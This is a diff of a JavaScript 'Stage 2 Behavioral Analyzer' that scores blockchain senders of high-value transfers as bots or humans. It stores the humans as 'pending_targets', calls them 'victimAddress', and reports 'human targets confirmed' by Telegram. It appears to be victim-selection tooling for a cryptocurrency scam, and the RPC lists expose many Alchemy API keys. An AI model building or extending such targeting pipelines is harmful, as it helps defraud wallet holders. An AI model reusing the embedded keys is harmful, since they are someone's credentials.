@@ -40,47 +40,26 @@ const PUBLIC_FALLBACKS = {
   bsc: [
     'https://bnb-mainnet.g.alchemy.com/v2/alch_6gTznTT4QnX3_0IE9gkY-',
     'https://bsc-dataseed.binance.org',
-    'https://bnb-mainnet.g.alchemy.com/v2/alch_z1J_ESjjLVZwSBLNoep84',
-    'https://bnb-mainnet.g.alchemy.com/v2/alch_-NvhHn24EgwhuMt38pZJr',
     'https://rpc.ankr.com/bsc',
-    'https://bnb-mainnet.g.alchemy.com/v2/alch_8ToIPT9Z3R1iQ55nksx8b',
     'https://bsc.publicnode.com',
-    'https://bnb-mainnet.g.alchemy.com/v2/alch_Qy6hQXdtdVlE7Z4uVxt_A',
     'https://1rpc.io/bnb',
-    'https://bnb-mainnet.g.alchemy.com/v2/alch_rniHI4MxzjBfNZ4bxmDu5',
     'https://bsc.drpc.org',
-    'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
-    'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh'
   ],
   polygon: [
     'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
     'https://polygon-rpc.com',
-    'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
-    'https://polygon-mainnet.g.alchemy.com/v2/alch_tAPr1C9JUzQZYax5pslu5',
     'https://rpc.ankr.com/polygon',
-    'https://polygon-mainnet.g.alchemy.com/v2/alch_Bq31mnvxmjdT70RCYLGLA',
     'https://polygon.llamarpc.com',
-    'https://polygon-mainnet.g.alchemy.com/v2/alch_17XYrB1qagYO9Edwxj7Cw',
     'https://polygon.publicnode.com',
-    'https://polygon-mainnet.g.alchemy.com/v2/alch_UQzY-saHkZZrowH7kylTu',
     'https://1rpc.io/polygon',
-    'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
-    'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11'
   ],
   ethereum: [
     'https://eth-mainnet.g.alchemy.com/v2/alch_F5VimAPoBoESKZ566us-U',
     'https://ethereum.publicnode.com',
-    'https://eth-mainnet.g.alchemy.com/v2/alch_x_oSlpf2bnfc6brp-BgzA',
-    'https://eth-mainnet.g.alchemy.com/v2/alch_tp8k4HI9tVpUEBmsF3kXc',
     'https://rpc.ankr.com/eth',
-    'https://eth-mainnet.g.alchemy.com/v2/alch_7viyR-7wWLgc2i9suQ6hS',
     'https://eth.llamarpc.com',
-    'https://eth-mainnet.g.alchemy.com/v2/ig-ZUQrtw2shXhW2NuT6W',
     'https://1rpc.io/eth',
-    'https://eth-mainnet.g.alchemy.com/v2/alch_dFm-5A7LhWtYU3_4Y103o',
     'https://eth.drpc.org',
-    'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
-    'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et'
   ],
 };
 
@@ -111,6 +90,14 @@ const BOT_SCORE_THRESHOLD = 0.6;
 let isFetching = false;
 
 // ─── UTILITIES ───
+async function safeSendAlert(message) {
+  try {
+    await sendAlert(message);
+  } catch (err) {
+    logger.warn(`[Notifier] Failed to send Telegram alert: ${err.message}`);
+  }
+}
+
 async function withRetry(fn, context, maxAttempts = 3, baseDelay = 1000) {
   let lastError;
   for (let attempt = 1; attempt <= maxAttempts; attempt++) {
@@ -135,7 +122,7 @@ async function promiseAllLimit(tasks, limit = 5) {
   return results;
 }
 
-// ─── STAGE 1: On-chain state checks (fast, standard JSON-RPC) ───
+// ─── STAGE 1: On-chain state checks ───
 async function passesStageOne(address) {
   try {
     const checksumAddr = getAddress(address);
@@ -170,37 +157,6 @@ function setAnalyzedCache(key, passes) {
   ANALYZED_CACHE.set(key, { passes, expiresAt: Date.now() + ANALYZED_CACHE_TTL_MS });
 }
 
-/**
- * Stage 1 + Stage 2 combined analysis using weighted scoring.
- * 
- * Score range: 0.0 (definitely human) to 1.0 (definitely bot)
- * Threshold: >= 0.6 = bot
- * 
- * Signals:
- *    +0.65  extreme_batch         (>= 3 transfers in a single block)
- *    +0.35  batch                 (exactly 2 in a block)
- *    +0.25  sustained_batch       (>= 3 different blocks each with a batch)
- *    +0.65  extreme_block_streak  (4+ transfers across consecutive/adjacent blocks)
- *    +0.40  block_streak          (3 transfers across consecutive/adjacent blocks)
- *    +0.30  24/7                  (> 75% hours, compressed into < 30 days)
- *    +0.35  robotic               (avg interval < 5min AND CV < 0.45)
- *    +0.60  single_recv_sweeper   (1 receiver, >= 30 txs, NOT a long-span human)
- *    +0.50  single_recv           (1 receiver, 10-29 txs, NOT a long-span human)
- *    +0.10  single_recv_humanlike (1 receiver but history spans > 90 days)
- *    +0.20  low_div               (2 receivers)
- *    +0.25  rapid                 (avg interval < 60s)
- *    +0.20  zero_gap              (> 40% of intervals are 0s)
- *    +0.55  high_density          (>= 60 txs inside <= 4 days)
- *    +0.35  dense                 (>= 30 txs inside <= 7 days)
- *    +0.60  high_daily_vol        (>= 30 txs at >= 15 outgoing/day)
- *    +0.40  daily_vol             (>= 20 txs at >= 8 outgoing/day)
- *    +0.50  mostly_rapid          (> 50% of transactions are < 180s apart)
- *    +0.40  rapid_bursts          (10+ rapid back-to-back outgoing transactions)
- *    -0.40  human_diversity       (> 10 receivers AND > 30 days span)
- *
- * @param {string} victimAddress - lowercase address of the sender/victim
- * @returns {Promise<boolean>} - true if likely human, false if likely bot
- */
 async function passesBehavioralHeuristics(victimAddress) {
   const cacheKey = victimAddress.toLowerCase();
 
@@ -210,7 +166,6 @@ async function passesBehavioralHeuristics(victimAddress) {
   }
 
   try {
-    // ─── STAGE 1 GATE ───
     const stage1 = await passesStageOne(victimAddress);
     if (!stage1.pass) {
       logger.debug(`[Analyzer] Stage 1 rejected ${cacheKey}: ${stage1.reason}`);
@@ -222,7 +177,6 @@ async function passesBehavioralHeuristics(victimAddress) {
 
     const checksumAddr = getAddress(victimAddress);
 
-    // ─── Source 1: DB high-value transfers ───
     const { data: dbTxs, error: dbErr } = await supabase
       .from('token_transfers')
       .select('block_timestamp, receiver, block_number')
@@ -233,7 +187,6 @@ async function passesBehavioralHeuristics(victimAddress) {
 
     const dbRows = (!dbErr && dbTxs) ? dbTxs : [];
 
-    // ─── Source 2: On-chain recent Transfer logs ───
     let onChainLogs = [];
     try {
       const currentBlock = await client.getBlockNumber();
@@ -256,7 +209,6 @@ async function passesBehavioralHeuristics(victimAddress) {
       onChainLogs = [];
     }
 
-    // ─── Combine all activity timestamps ───
     const allTimestamps = [];
 
     for (const tx of dbRows) {
@@ -285,36 +237,26 @@ async function passesBehavioralHeuristics(victimAddress) {
 
     allTimestamps.sort((a, b) => a - b);
 
-    // ─── INSUFFICIENT DATA ───
     if (allTimestamps.length < 5) {
       setAnalyzedCache(cacheKey, true);
       return true;
     }
 
-    // ─── Calculate intervals and metrics ───
     const intervals = [];
     let zeroGapCount = 0;
     let totalIntervalCount = 0;
     let minInterval = Infinity;
-    let rapidCount = 0; // < 180 seconds (3 minutes)
-    let rapidBurstCount = 0; // outgoing rapid bursts (< 30 seconds)
+    let rapidCount = 0;
+    let rapidBurstCount = 0;
 
     for (let i = 1; i < allTimestamps.length; i++) {
       const gapMs = allTimestamps[i] - allTimestamps[i - 1];
       const gapSeconds = gapMs / 1000;
       totalIntervalCount++;
 
-      if (gapSeconds > 0 && gapSeconds < minInterval) {
-        minInterval = gapSeconds;
-      }
-
-      if (gapSeconds < 180) {
-        rapidCount++;
-      }
-
-      if (gapSeconds < 30) {
-        rapidBurstCount++;
-      }
+      if (gapSeconds > 0 && gapSeconds < minInterval) minInterval = gapSeconds;
+      if (gapSeconds < 180) rapidCount++;
+      if (gapSeconds < 30) rapidBurstCount++;
 
       if (gapMs > 30000) {
         intervals.push(gapMs);
@@ -326,7 +268,6 @@ async function passesBehavioralHeuristics(victimAddress) {
     const zeroGapRatio = totalIntervalCount > 0 ? zeroGapCount / totalIntervalCount : 0;
     const rapidRatio = totalIntervalCount > 0 ? rapidCount / totalIntervalCount : 0;
 
-    // ─── Batch Detection ───
     const blockCounts = new Map();
     for (const log of onChainLogs) {
       const bn = Number(log.blockNumber);
@@ -348,7 +289,6 @@ async function passesBehavioralHeuristics(victimAddress) {
 
     const effectiveMaxBatch = Math.max(maxBatchSize, dbMaxBatch);
 
-    // ─── Consecutive-Block Streak ───
     let maxBlockStreak = 0;
     let currentStreak = 0;
     for (let i = 1; i < onChainBlockNumbers.length; i++) {
@@ -361,7 +301,6 @@ async function passesBehavioralHeuristics(victimAddress) {
       }
     }
 
-    // ─── Time-based metrics ───
     const spanMs = allTimestamps.length >= 2
       ? allTimestamps[allTimestamps.length - 1] - allTimestamps[0]
       : 0;
@@ -374,7 +313,7 @@ async function passesBehavioralHeuristics(victimAddress) {
     const hourCoverage = hours.size / 24;
 
     const avgInterval = intervals.length > 0
-      ? intervals.reduce((a, b) => a + b, 0) / intervals.length / 1000 // convert to seconds
+      ? intervals.reduce((a, b) => a + b, 0) / intervals.length / 1000
       : 0;
 
     const variance = intervals.length > 0
@@ -382,7 +321,6 @@ async function passesBehavioralHeuristics(victimAddress) {
       : 0;
     const cv = avgInterval === 0 ? 0 : Math.sqrt(variance) / avgInterval;
 
-    // ─── Receiver Diversity ───
     const dbReceivers = new Set(dbRows.map(t => (t.receiver || '').toLowerCase()));
     const onChainReceivers = new Set(onChainLogs.map(l => l.args.to.toLowerCase()));
     const allUniqueReceivers = new Set([...dbReceivers, ...onChainReceivers]);
@@ -391,11 +329,9 @@ async function passesBehavioralHeuristics(victimAddress) {
     const totalActivity = allTimestamps.length;
     const transfersPerDay = spanDays > 0.001 ? totalActivity / spanDays : 0;
 
-    // ─── WEIGHTED SCORING ───
     let score = 0;
     const signals = [];
 
-    // 1. In-block batching
     if (effectiveMaxBatch >= 3) {
       score += 0.65;
       signals.push(`extreme_batch(max=${effectiveMaxBatch})`);
@@ -404,13 +340,11 @@ async function passesBehavioralHeuristics(victimAddress) {
       signals.push(`batch(max=${effectiveMaxBatch})`);
     }
 
-    // 2. Sustained batching
     if (batchBlockCount >= 3) {
       score += 0.25;
       signals.push(`sustained_batch(${batchBlockCount}blocks)`);
     }
 
-    // 3. Consecutive-block execution streak
     if (maxBlockStreak >= 3) {
       score += 0.65;
       signals.push(`extreme_block_streak(${maxBlockStreak})`);
@@ -419,19 +353,16 @@ async function passesBehavioralHeuristics(victimAddress) {
       signals.push(`block_streak(${maxBlockStreak})`);
     }
 
-    // 4. 24/7 activity
     if (hourCoverage > 0.75 && spanDays < 30) {
       score += 0.30;
       signals.push(`24/7(${hours.size}h/${spanDays.toFixed(0)}d)`);
     }
 
-    // 5. Robotic timing
     if (avgInterval < 300 && cv < 0.45 && intervals.length >= 5) {
       score += 0.35;
       signals.push(`robotic(avg=${avgInterval.toFixed(0)}s,cv=${cv.toFixed(2)})`);
     }
 
-    // 6. Single receiver = sweeper / forwarder
     if (receiverCount === 1) {
       const humanLike = spanDays > 90;
       if (humanLike) {
@@ -449,19 +380,16 @@ async function passesBehavioralHeuristics(victimAddress) {
       signals.push(`low_div(${receiverCount})`);
     }
 
-    // 7. Extreme frequency
     if (avgInterval < 60 && avgInterval > 0) {
       score += 0.25;
       signals.push(`rapid(${avgInterval.toFixed(0)}s)`);
     }
 
-    // 8. High zero-gap ratio
     if (zeroGapRatio > 0.40) {
       score += 0.20;
       signals.push(`zero_gap(${(zeroGapRatio * 100).toFixed(0)}%)`);
     }
 
-    // 9. High-density campaign burst
     if (spanDays <= 4 && totalActivity >= 60) {
       score += 0.55;
       signals.push(`high_density(${totalActivity}tx/${spanDays.toFixed(1)}d)`);
@@ -470,7 +398,6 @@ async function passesBehavioralHeuristics(victimAddress) {
       signals.push(`dense(${totalActivity}tx/${spanDays.toFixed(1)}d)`);
     }
 
-    // 10. Sustained daily outgoing volume
     if (totalActivity >= 30 && transfersPerDay >= 15) {
       score += 0.60;
       signals.push(`high_daily_vol(${transfersPerDay.toFixed(0)}/day)`);
@@ -479,27 +406,22 @@ async function passesBehavioralHeuristics(victimAddress) {
       signals.push(`daily_vol(${transfersPerDay.toFixed(0)}/day)`);
     }
 
-    // 11. Ratio-based rapid detection (> 50% of transactions are < 3 min apart)
     if (totalIntervalCount > 10 && rapidRatio > 0.50) {
       score += 0.50;
       signals.push(`mostly_rapid(${(rapidRatio * 100).toFixed(0)}%)`);
     }
 
-    // 12. Rapid outgoing burst check (replaces flawed sweep count on outgoing-only data)
     if (rapidBurstCount >= 10) {
       score += 0.40;
       signals.push(`rapid_bursts(${rapidBurstCount}x)`);
     }
 
-    // 13. Human diversity rescue (negative score for diverse, long-lived wallets)
     if (receiverCount > 10 && spanDays > 30) {
       score -= 0.40;
       signals.push(`human_diversity(${receiverCount} contracts)`);
     }
 
-    // Cap score between 0 and 1
     score = Math.max(0, Math.min(score, 1.0));
-
     const isHuman = score < BOT_SCORE_THRESHOLD;
 
     if (!isHuman) {
@@ -548,9 +470,10 @@ async function fetchPendingTargets() {
 
     logger.info(`Threshold block for 40-day window: ${thresholdBlock} (max block: ${maxBlockData[0].block_number})`);
 
-    const BATCH_SIZE = 1000;
+    const BATCH_SIZE = 100;
     let totalInserted = 0;
     let totalFiltered = 0;
+    let totalDeleted = 0;
     let pageCount = 0;
 
     while (true) {
@@ -578,15 +501,16 @@ async function fetchPendingTargets() {
           const sender = row.sender.toLowerCase();
 
           try {
-            logger.debug(`[Analyzer] Processing ${index + 1}/${rows.length}: ${sender}`);
+            logger.info(`[Analyzer] Processing ${index + 1}/${rows.length}: ${sender}`);
 
             const timeoutPromise = new Promise((_, reject) => {
               setTimeout(() => reject(new Error('Analysis timeout')), TIMEOUT_MS);
             });
 
-            const analysisPromise = passesBehavioralHeuristics(sender);
-
-            const isHuman = await Promise.race([analysisPromise, timeoutPromise]);
+            const isHuman = await Promise.race([
+              passesBehavioralHeuristics(sender),
+              timeoutPromise
+            ]);
 
             if (!isHuman) {
               logger.debug(`[Analyzer] Rejected bot: ${sender}`);
@@ -616,6 +540,7 @@ async function fetchPendingTargets() {
       const filteredCount = rows.length - insertData.length;
       totalFiltered += filteredCount;
 
+      // 1. Insert human targets into pending_targets
       if (insertData.length > 0) {
         const insertedCount = await withRetry(async () => {
           const { data, error } = await supabase
@@ -635,9 +560,40 @@ async function fetchPendingTargets() {
         logger.info(`Page ${pageCount}: All ${rows.length} rejected by heuristics.`);
       }
 
+      // 2. Delete ALL processed senders (both bots and humans) from token_transfers
+      const evaluatedSenders = [...new Set(rows.map(r => r.sender.toLowerCase()))];
+
+      if (evaluatedSenders.length > 0) {
+        try {
+          let pageDeleted = 0;
+          const DELETE_CHUNK_SIZE = 50;
+
+          for (let i = 0; i < evaluatedSenders.length; i += DELETE_CHUNK_SIZE) {
+            const chunk = evaluatedSenders.slice(i, i + DELETE_CHUNK_SIZE);
+
+            const { error, count } = await supabase
+              .from('token_transfers')
+              .delete({ count: 'exact' })
+              .eq('chain_id', chainId)
+              .in('sender', chunk);
+
+            if (error) {
+              logger.error(`[Cleanup] Failed to delete senders from token_transfers: ${error.message}`);
+            } else {
+              pageDeleted += count || 0;
+            }
+          }
+
+          totalDeleted += pageDeleted;
+          logger.info(`Page ${pageCount}: Deleted ${pageDeleted} transfer records for ${evaluatedSenders.length} evaluated senders`);
+        } catch (deleteError) {
+          logger.error(`[Cleanup] Error deleting from token_transfers: ${deleteError.message}`);
+        }
+      }
+
       if (rows.length < BATCH_SIZE) break;
-      if (pageCount > 100) {
-        logger.warn('Reached pagination safety limit. Stopping.');
+      if (pageCount > 10000) {
+        logger.warn('Reached pagination safety limit (10000 pages). Stopping.');
         break;
       }
     }
@@ -650,17 +606,17 @@ async function fetchPendingTargets() {
 
     const totalInDb = countError ? 'Unknown' : totalCount;
 
-    logger.info(`[Stage 2] Run complete. Added: ${totalInserted} | Filtered: ${totalFiltered} bots | Total in DB: ${totalInDb}`);
+    logger.info(`[Stage 2] Run complete. Added: ${totalInserted} | Filtered: ${totalFiltered} bots | Deleted: ${totalDeleted} records | Total pending: ${totalInDb}`);
 
     if (totalInserted > 0 || totalFiltered > 0) {
-      await sendAlert(
-        `📊 [${chainName.toUpperCase()}] Stage 2: +${totalInserted} human targets confirmed, ${totalFiltered} bots filtered. Total pending: ${totalInDb}`
+      await safeSendAlert(
+        `📊 [${chainName.toUpperCase()}] Stage 2: +${totalInserted} human targets confirmed, ${totalFiltered} bots filtered, ${totalDeleted} raw transfers cleaned. Total pending: ${totalInDb}`
       );
     }
 
   } catch (error) {
     logger.error(`[Stage 2] Fatal error: ${error.message}`);
-    await sendAlert(formatAlert('error', { source: 'Stage2Analyzer', error: error.message }));
+    await safeSendAlert(formatAlert('error', { source: 'Stage2Analyzer', error: error.message }));
   } finally {
     isFetching = false;
   }
@@ -670,7 +626,11 @@ async function startObserver() {
   logger.info('Starting Stage 2 Behavioral Analyzer (continuous mode)');
   logger.info(`Polling interval: ${QUALIFIED_POLL_INTERVAL_MS / 1000}s | Chain: ${chainName} | Lookback: ${LOOKBACK} blocks`);
 
-  await fetchPendingTargets();
+  try {
+    await fetchPendingTargets();
+  } catch (err) {
+    logger.error(`[Stage 2] Initial fetch failed: ${err.message}. Will retry on next interval.`);
+  }
 
   setInterval(async () => {
     try {
@@ -688,6 +648,6 @@ onShutdown(async () => {
 
 startObserver().catch(async (err) => {
   logger.error(`[Stage 2] Fatal startup error: ${err.message}`);
-  await sendAlert(formatAlert('error', { source: 'Stage2Startup', error: err.message }));
+  await safeSendAlert(formatAlert('error', { source: 'Stage2Startup', error: err.message }));
   process.exit(1);
 });
